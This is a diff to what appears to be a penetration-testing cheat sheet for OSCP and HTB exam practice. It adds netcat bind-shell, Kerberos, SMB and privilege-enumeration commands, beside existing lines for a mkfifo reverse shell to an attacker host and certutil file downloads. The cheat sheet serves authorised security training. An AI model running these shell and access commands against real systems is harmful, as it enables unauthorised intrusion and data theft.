@@ -3,6 +3,12 @@
 > **Exam Restrictions**: Automatic exploitation tools like `sqlmap` and LinPEAS auto-exploitation are prohibited. Always verify current guidelines before the exam.
 > - [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
 > - [Proctored Exams](https://help.offsec.com/hc/en-us/sections/360008126631-Proctored-Exams)
+>
+> **OSCP / HTB Notes**:
+> - Keep evidence and commands clearly documented; avoid automation where exam policy forbids it.
+> - Verify manual exploitability and service versions before reporting.
+> - When pivoting, confirm internal DNS/service reachability and note all network paths.
+> - Capture every access method, note credential sources, and preserve payload context for reporting.
 
 ---
 
@@ -190,6 +196,7 @@ certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 ##### Netcat
 ```bash
 nc -lnvp <LPORT> > <FILE>                                        # Listener
+nc -lnvp <LPORT> -e /bin/bash                                   # Listener with shell
 nc <RHOST> <RPORT> < <FILE>                                      # Sender
 mkfifo /tmp/backpipe;cat /tmp/backpipe|bash -i 2>&1|nc <ATTACKER_IP> 1337 > /tmp/backpipe
 ```
@@ -211,6 +218,7 @@ powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfil
 ##### Python/PHP Web Servers
 ```bash
 sudo python3 -m http.server 80
+python3 -m http.server 8000
 sudo php -S 127.0.0.1:80
 ```
 
@@ -231,6 +239,8 @@ sudo apt-get install krb5-kdc
 ##### Ticket Handling
 ```bash
 impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'
+klist
+kinit <USERNAME>@<REALM>
 export KRB5CCNAME=<FILE>.ccache
 export KRB5CCNAME='realpath <FILE>.ccache'
 ```
@@ -271,6 +281,8 @@ xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
 ```bash
 smbclient -L \\<RHOST>\ -N
 smbclient //<RHOST>/<SHARE>
+smbclient //<RHOST>/<SHARE> -U guest%
+smbclient -m SMB3 -U '<USERNAME>%<PASSWORD>' //<RHOST>/<SHARE>
 smbclient //<RHOST>/<SHARE> -U <USERNAME>
 smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
 mount.cifs //<RHOST>/<SHARE> /mnt/remote
@@ -857,6 +869,7 @@ cat /etc/passwd /etc/hosts /etc/fstab /etc/crontab
 lsblk && ss -tulpn && ps -auxf
 ls -lahv /opt /home
 find / -perm -4000 2>/dev/null | xargs ls -la                   # SUID binaries
+find / -type f -perm /4000 2>/dev/null
 find / -type f -user root -perm -4000 2>/dev/null
 find / -writable -type d 2>/dev/null
 find / -cmin -60 2>/dev/null                                     # changed in last 60 min
@@ -950,6 +963,7 @@ whoami /all
 systeminfo
 net accounts && net user && net user /domain
 Get-LocalUser; Get-LocalGroup; Get-LocalGroupMember <GROUP>
+Get-Service
 Get-Process
 tree /f C:\Users\
 tasklist /SVC
